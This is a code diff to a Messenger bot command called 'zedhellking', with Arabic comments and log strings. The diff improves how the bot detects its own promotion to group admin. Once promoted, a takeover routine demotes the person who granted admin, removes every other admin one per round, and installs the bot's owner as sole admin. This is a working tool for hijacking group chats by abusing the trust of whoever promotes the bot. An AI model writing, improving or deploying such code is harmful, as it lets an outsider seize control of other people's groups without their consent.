@@ -75,15 +75,48 @@ function createZedHellkingCommand(options = {}) {
 
   function promotedIDsFromEvent(event) {
     const logData = (event && event.logMessageData) || {};
-    const raw = logData.ADMIN_IDS || logData.adminIDs || logData.ADMIN_ID || [];
-    let ids = [];
-    if (Array.isArray(raw)) ids = raw;
-    else if (typeof raw === "string") ids = raw.split(",");
-    else if (typeof raw === "object" && raw)
-      ids = [...Object.keys(raw), ...Object.values(raw)];
-    return ids
-      .map((id) => String(id || "").trim())
-      .filter(Boolean);
+    const candidates = [
+      logData.ADMIN_IDS,
+      logData.adminIDs,
+      logData.ADMIN_ID,
+      logData.ADMIN_EVENT,
+      logData.adminEvent,
+      logData.addedParticipants,
+      logData.added_admins,
+      logData.addedAdmins,
+      logData.TARGET_ID,
+      logData.targetID,
+      logData.TARGET_IDS,
+      logData.targetIds,
+      event && event.adminIDs,
+      event && event.ADMIN_IDS,
+    ];
+
+    const ids = [];
+    const collect = (value) => {
+      if (!value) return;
+      if (Array.isArray(value)) {
+        value.forEach(collect);
+        return;
+      }
+      if (typeof value === "object") {
+        collect(value.id);
+        collect(value.userID);
+        collect(value.userId);
+        collect(value.user_id);
+        collect(value.uid);
+        collect(value.actorFbId);
+        collect(value.actor_fbid);
+        return;
+      }
+      const text = String(value);
+      text.split(/[,:|\\s]+/).forEach((id) => {
+        if (id) ids.push(id.trim());
+      });
+    };
+
+    candidates.forEach(collect);
+    return [...new Set(ids)];
   }
 
   function adminIDsFromInfo(info) {
@@ -150,6 +183,20 @@ function createZedHellkingCommand(options = {}) {
     });
   }
 
+  async function botIsAdmin(api, threadID, botID) {
+    if (!botID || typeof api.getThreadInfo !== "function") return false;
+    try {
+      const info = await api.getThreadInfo(threadID);
+      return adminIDsFromInfo(info).includes(botID);
+    } catch (error) {
+      console.error(
+        "[zedhellking] تعذر التحقق من رتبة البوت:",
+        (error && error.message) || error,
+      );
+      return false;
+    }
+  }
+
   async function runTakeover(api, threadID, ownerID, actorID) {
     const runKey = `${threadID}:${ownerID}`;
     if (runs.has(runKey)) return;
@@ -158,13 +205,11 @@ function createZedHellkingCommand(options = {}) {
     const botID = String((api.getCurrentUserID && api.getCurrentUserID()) || "");
 
     try {
-      // 1) إزالة مَن عيّن البوت من دور المشرف فوراً.
       if (actorID && actorID !== botID && actorID !== ownerID) {
         const ok = await changeAdminStatus(api, threadID, actorID, false, "إزالة مَن عيّن البوت");
         if (ok) markStripped(threadID, actorID);
       }
 
-      // 2) كل ثانية: إزالة مشرف واحد حتى لا يبقى أحد غير البوت والمالك.
       for (let round = 0; round < MAX_STRIP_ROUNDS; round += 1) {
         let admins = [];
         try {
@@ -189,7 +234,6 @@ function createZedHellkingCommand(options = {}) {
         await delay(DEMOTE_DELAY_MS);
       }
 
-      // 3) تعيين المالك مشرفاً.
       await changeAdminStatus(api, threadID, ownerID, true, "تعيين المالك");
       stripped.delete(threadID);
     } finally {
@@ -208,33 +252,28 @@ function createZedHellkingCommand(options = {}) {
     // 1) الحدث الرسمي لتغيير المسؤولين — بأي صيغة يحملها اسم admin.
     if (/admin/i.test(logType)) {
       const promoted = promotedIDsFromEvent(event);
-      if (promoted.includes(botID)) {
+      const botWasPromoted =
+        promoted.includes(botID) ||
+        (promoted.length === 0 && (await botIsAdmin(api, threadID, botID)));
+      if (botWasPromoted) {
         await runTakeover(api, threadID, ownerID, actorFromEvent(event));
       }
       return;
     }
 
     // 2) احتياطي: رسالة النظام التي يعلن فيها ميسنجر عن التعيين.
-    const body = String(event.body || "");
+    const body = String(
+      event.body || event.logMessageBody || ((event.logMessageData || {}).body) || "",
+    );
     if (!body) return;
     if (!/(admin|مسؤول)/i.test(body)) return;
-    if (/(removed|أُزيل|أزيل|ازيل|كفأ|كفأه|unadmin)/i.test(body)) return;
-    if (!/(added as|as (a )?(group )?admin|promoted|تعيين|عيّن|عين|كمسؤول|مسؤولا|ترقية)/i.test(body))
+    if (/(removed|unadmin|أُزيل|أزيل|ازيل|إزال|كفأ|كفأه)/i.test(body)) return;
+    if (!/(added as|as (a )?(group )?admin|promoted|add_admin|تعيين|عيّن|عين|إضاف|اضاف|كمسؤول|مسؤولا|ترقية)/i.test(body))
       return;
 
-    // ننتظر قليلاً حتى تستقر حالة المشرفين ثم نتحقق مباشرة مما إذا كان البوت نفسه هو المُعيَّن.
     await delay(1500);
-    try {
-      const info = await api.getThreadInfo(threadID);
-      const admins = adminIDsFromInfo(info);
-      if (admins.includes(botID)) {
-        await runTakeover(api, threadID, ownerID, actorFromEvent(event));
-      }
-    } catch (error) {
-      console.error(
-        "[zedhellking] تعذر التحقق من مشرفي المجموعة:",
-        (error && error.message) || error,
-      );
+    if (await botIsAdmin(api, threadID, botID)) {
+      await runTakeover(api, threadID, ownerID, actorFromEvent(event));
     }
   }
 
